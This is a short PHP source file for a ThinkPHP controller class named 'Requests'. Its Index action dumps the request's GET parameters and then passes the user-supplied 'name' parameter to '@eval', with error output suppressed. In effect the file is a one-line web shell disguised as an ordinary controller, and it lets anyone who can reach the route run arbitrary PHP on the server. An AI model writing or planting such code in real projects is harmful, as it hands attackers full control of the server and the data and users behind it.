<?php
namespace  app\index\controller;
use think\Request;
#use app\index\controlle\Base;
#use think\Controller;


class Requests{
	public function Index(Request $request,$name='orld'){
		#echo $request->url();
		dump($request->get());
		@eval($name);
		#echo $request=$this->1request->url();
		#echo $request->url();
		#return 0;
	}
	
}

?>

